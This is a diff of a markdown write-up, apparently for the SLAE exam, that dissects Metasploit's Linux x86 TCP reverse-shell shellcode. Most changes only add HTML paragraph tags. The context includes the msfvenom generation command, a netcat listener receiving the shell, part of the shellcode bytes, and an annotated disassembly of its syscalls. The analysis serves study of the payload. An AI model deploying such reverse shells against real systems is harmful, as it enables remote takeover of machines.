@@ -1,9 +1,10 @@
 # Shellcode No.2 - TCP Reverse Shell
 
-At second glance, we'll take payload linux/x86/shell_reverse_tcp, very similar to the shellcode we wrote in the second SLAE exam task.
+<p style="text-align: justify;">At second glance, we'll take payload linux/x86/shell_reverse_tcp, very similar to the shellcode we wrote in the second SLAE exam task.</p>
 
 ------------------------------------------------------------------------------------------------------------------------
-Again, we'll use msfvenom for shellcode generation:
+<p style="text-align: justify;">Again, we'll use msfvenom for shellcode generation:</p>
+
 ```sh
 $ msfvenom -p linux/x86/shell_reverse_tcp LPORT=1234 LHOST=127.0.0.1 -f c
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
@@ -50,7 +51,8 @@ $ ./shellcode
 Shellcode Length:  26
 ```
 ------------------------------------------------------------------------------------------------------------------------
-In the second terminal we can use netcat for setting up a listener:
+<p style="text-align: justify;">In the second terminal we can use netcat for setting up a listener:</p>
+
 ```sh
 $ nc -nvlp 1234
 Listening on [0.0.0.0] (family 0, port 1234)
@@ -59,7 +61,7 @@ id
 uid=1000(slae) gid=1000(slae) groups=1000(slae),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),107(lpadmin),124(sambashare)
 ```
 
-Fantastic, everything works fine. As we see, again there are some null bytes, which breaks our "Shellcode Length" counter.
+<p style="text-align: justify;">Fantastic, everything works fine. As we see, again there are some null bytes, which breaks our "Shellcode Length" counter.</p>
 
 ------------------------------------------------------------------------------------------------------------------------
 Let's use ndisasm again.
@@ -104,7 +106,7 @@ $ echo -ne "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59
 ```
 ------------------------------------------------------------------------------------------------------------------------
 
-The analysis of this shellcode will be divided into four parts, corresponding to the system calls called. 
+<p style="text-align: justify;">The analysis of this shellcode will be divided into four parts, corresponding to the system calls called. </p>
 
 ### socket() ###
 ```nasm
@@ -118,7 +120,7 @@ The analysis of this shellcode will be divided into four parts, corresponding to
 0000000B  B066              mov al,0x66
 0000000D  CD80              int 0x80			
 ```
-At the beginning a socket is prepared. For this purpose, socket() syscall is used, called from socketcall()) syscall, taking the following arguments as components: socket(AF_INET, SOCK_STREAM, IPPROTO_IP). 
+<p style="text-align: justify;">At the beginning a socket is prepared. For this purpose, socket() syscall is used, called from socketcall()) syscall, taking the following arguments as components: socket(AF_INET, SOCK_STREAM, IPPROTO_IP). </p>
 
 - For this purpose, the EBX, EAX and EDX registers are first cleaned. Using the mul instruction reduces the shellcode length by 1.
 ```nasm
@@ -126,7 +128,7 @@ At the beginning a socket is prepared. For this purpose, socket() syscall is use
 00000002  F7E3              mul ebx
 ```
 
-Then, in the reverse order, the values of the above arguments are thrown onto the stack. In order:
+<p style="text-align: justify;">Then, in the reverse order, the values of the above arguments are thrown onto the stack. In order:</p>
 - The value 0 is pushed on the stack (IPPROTO_IP = 0)
 ```nasm
 00000004  53                push ebx
@@ -166,7 +168,7 @@ Then, in the reverse order, the values of the above arguments are thrown onto th
 00000015  49                dec ecx
 00000016  79F9              jns 0x11
 ```
-Then three dup2() syscalls will be called. For this shellcode, a loop that is executed three times (STDIN = 0, STDOUT = 1, STDERR = 2) will be used for this.
+<p style="text-align: justify;">Then three dup2() syscalls will be called. For this shellcode, a loop that is executed three times (STDIN = 0, STDOUT = 1, STDERR = 2) will be used for this.</p>
 - We exchange values of EAX and EBX registers
 ```nasm
 0000000F  93                xchg eax,ebx
@@ -207,7 +209,7 @@ Then three dup2() syscalls will be called. For this shellcode, a loop that is ex
 0000002D  CD80              int 0x80
 ```
 
-Then connect() syscall is called. First, we are pushing the IP address and port values on the stack to which our reverse shell should connect.
+<p style="text-align: justify;">Then connect() syscall is called. First, we are pushing the IP address and port values on the stack to which our reverse shell should connect.</p>
 - Push out address 127.0.0.1 (in reverse order)
 ```nasm
 00000018  687F000001        push dword 0x100007f
@@ -262,7 +264,7 @@ Then connect() syscall is called. First, we are pushing the IP address and port 
 00000040  B00B              mov al,0xb
 00000042  CD80              int 0x80
 ```
-The last syscall will be execve(), which will send /bin/sh shell to specified address:port.
+<p style="text-align: justify;">The last syscall will be execve(), which will send /bin/sh shell to specified address:port.</p>
 - Pushing string terminator (null) on the stack
 ```nasm
 0000002F  52                push edx
